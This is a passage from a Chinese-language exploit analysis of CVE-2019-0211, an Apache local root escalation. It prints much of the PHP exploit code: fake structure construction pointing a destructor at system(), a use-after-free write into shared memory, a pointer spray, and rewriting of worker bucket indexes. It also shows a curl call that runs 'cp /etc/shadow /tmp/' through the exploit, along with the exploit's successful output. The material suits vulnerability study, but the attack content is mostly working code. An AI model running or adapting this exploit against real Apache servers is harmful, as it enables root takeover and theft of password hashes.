然后是properties（zend_array和apr_proc_mutex_t结构的叠加），`u-nTableMask`的位置将用作`apr_proc_mutex_t`结构的`meth`，而`arData`指向payload中的bucket。
                $properties = 
                # refcount
                ptr2str(1) .
                # u-nTableMask meth
                ptr2str($payload_start + strlen($bucket)) .
                # Bucket arData
                ptr2str($payload_start) .
                # uint32_t nNumUsed;
                ptr2str(1, 4) .
                # uint32_t nNumOfElements;
                ptr2str(0, 4) .
                # uint32_t nTableSize
                ptr2str(0, 4) .
                # uint32_t nInternalPointer
                ptr2str(0, 4) .
                # zend_long nNextFreeElement
                $z .
                # dtor_func_t pDestructor
                ptr2str($addresses['system'])
            ;
将三个部分组合：
            $payload = 
                $bucket .
                $meth .
                $properties
            ;
通过前面UAF控制的字符串`abc`写入SHM未使用部分的开头
            o('Placing payload at address 0x' . dechex($payload_start));
            $p = $payload_start - $address;
            for(
                $i = 0;
                $i abc[$p+$i] = $payload[$i];
            }
打印信息，将SHM剩下的部分喷射为properties的地址
            $properties_address = $payload_start + strlen($bucket) + strlen($meth);
            o('Spraying pointer');
            o('  Address: 0x' . dechex($properties_address));
            o('  From: 0x' . dechex($spray_min));
            o('  To: 0x' . dechex($spray_max));
            o('  Size: 0x' . dechex($spray_size));
            o('  Covered: 0x' . dechex($spray_size * count($workers_pids)));
            o('  Apache: 0x' . dechex(
                $addresses['apache'][1] -                $addresses['apache'][0]
            ));
            $s_properties_address = ptr2str($properties_address);
            for(
                $i = $spray_min;
                $i abc[$i - $address] = $s_properties_address[$i % 8];
            }
讲到这里可以再回头看看文章刚开始的图，应该就更容易理解了。
![
](https://images.seebug.org/content/images/2019/05/6e92e94e-fda1-4abe-a8ee-5619283ea00c.jpg-w331s)
### 2.6 进一步提高成功率
前面还讲到，可以修改每个worker的`process_score->bucket`结构，这样一来，利用成功率就可以再乘以Apache
Worker的数量，因为2.4中计算出的bucket索引能落在了SHM之外，如果有多个worker，如下图所示，就能提高`&all_buckets[bucket]`落在SHM中的概率：
![
](https://images.seebug.org/content/images/2019/05/dc235d79-a3e2-478c-98a8-19bbe83a3386.jpg-w331s)
迭代查找每个`process_score`结构直到找到每个PID，再将找到的PID`$workers_pids`中的PID对比，匹配的就说明是正确的结构。
    $spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);
    $total_nb_buckets = $spray_nb_buckets * count($workers_pids);
    $bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);
            for(
                $p = $addresses['shm'][0] + 0x20;
                $p  0;
                $p += 0x24
            )
            {
                $l = $p - $address;
                $current_pid = str2ptr($this->abc, $l, 4);
                o('Got PID: ' . $current_pid);
                # The PID matches one of the workers
                if(in_array($current_pid, $workers_pids))
                {
                    unset($workers_pids[$current_pid]);
                    o('  PID matches');
将所有worker`process_score.bucket`都进行修改，而非修改其中一个：
                    # Update bucket address
                    $s_bucket_index = pack('l', $bucket_index);
                    $this->abc[$l + 0x20] = $s_bucket_index[0];
                    $this->abc[$l + 0x21] = $s_bucket_index[1];
                    $this->abc[$l + 0x22] = $s_bucket_index[2];
                    $this->abc[$l + 0x23] = $s_bucket_index[3];
                    o('  Changed bucket value to ' . $bucket_index);
                    $min = $spray_min - $size_prefork_child_bucket * $bucket_index;
                    $max = $spray_max - $size_prefork_child_bucket * $bucket_index;
                    o('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));
                    # This bucket range is covered, go to the next one
                    $bucket_index += $spray_nb_buckets;
到这里，整个漏洞利用过程就结束了，可以等到6:25AM查看利用是否利用成功，也可以手动执行`apachectl graceful`验证
            if(count($workers_pids) > 0)
            {
                o(
                    'Unable to find PIDs ' .
                    implode(', ', $workers_pids) .
                    ' in SHM, exiting.'
                );
                exit();
            }
            o('');
            o('EXPLOIT SUCCESSFUL.');
            o('Await 6:25AM.');
            return 0;
    ➜ curl http://192.168.116.133/carpediem.php\?cmd\=cp+/etc/shadow+/tmp/
    CARPE (DIEM) ~ CVE-2019-0211
    PID: 887
    Fetching addresses
      zend_object_std_dtor: 0x7fc38f605700
      system: 0x7fc3936bc480
      libaprX: 0x7fc393c39000-0x0x7fc393c6b000
      libaprR: 0x7fc393e6b000-0x0x7fc393e6c000
      shm: 0x7fc394456000-0x0x7fc39446a000
      apache: 0x7fc39446a000-0x0x7fc39452a000
    Obtaining apache workers PIDs
      Found apache worker: 887
      Found apache worker: 888
      Found apache worker: 889
      Found apache worker: 890
      Found apache worker: 891
    Got 5 PIDs.
    Triggering UAF
      Creating room and filling empty spaces
      Allocating $abc and $p
      Unsetting both variables and setting $protector
      Creating DateInterval object
    UAF successful.
    Address of $abc: 0x7fc38aaa34e8
    Looking for all_buckets in memory
      [&mutex]: 0x7fc3944cab70
        [mutex]: 0x7fc3944cacc0
          [meth]: 0x7fc393e6bca0
            [*]: 0x7fc393c53ce0
            [*]: 0x7fc393c541b0
            [*]: 0x7fc393c53e90
            [*]: 0x7fc393c54210
            [*]: 0x7fc393c53bf0
            [*]: 0x7fc393c53960
            [*]: 0x7fc393c6228c
    all_buckets = 0x7fc3944cab60
    Computing potential bucket indexes and addresses
    [bucket_index_middle]: -17858
    Placing payload at address 0x7fc39445a148
    Spraying pointer
      Address: 0x7fc39445a218
      From: 0x7fc39445a250
      To: 0x7fc39446a000
      Size: 0xfdb0
      Covered: 0x4f470
      Apache: 0xc0000
    Iterating in SHM to find PIDs...
    [spray_nb_bucket]: 2706
    [total_nb_buckets]: 13530
    [bucket_index]: -24623
    Got PID: 887
      PID matches
      Changed bucket value to -24623
      Ranges: 0x7fc3944ea6b8 - 0x7fc3944fa468
    Got PID: 888
      PID matches
      Changed bucket value to -21917
      Ranges: 0x7fc3944da908 - 0x7fc3944ea6b8
    Got PID: 889
      PID matches
      Changed bucket value to -19211
      Ranges: 0x7fc3944cab58 - 0x7fc3944da908
    Got PID: 890
      PID matches
      Changed bucket value to -16505
      Ranges: 0x7fc3944bada8 - 0x7fc3944cab58
    Got PID: 891
      PID matches
      Changed bucket value to -13799
      Ranges: 0x7fc3944aaff8 - 0x7fc3944bada8
    EXPLOIT SUCCESSFUL.
    Await 6:25AM.
## 三、参考
[1] [CVE-2019-0211 Apache Root Privilege
Escalation](https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html)  
[2]
[exploit](https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache)  
[3] [PHP7内核剖析](https://www.kancloud.cn/nickbai/php7)
* * *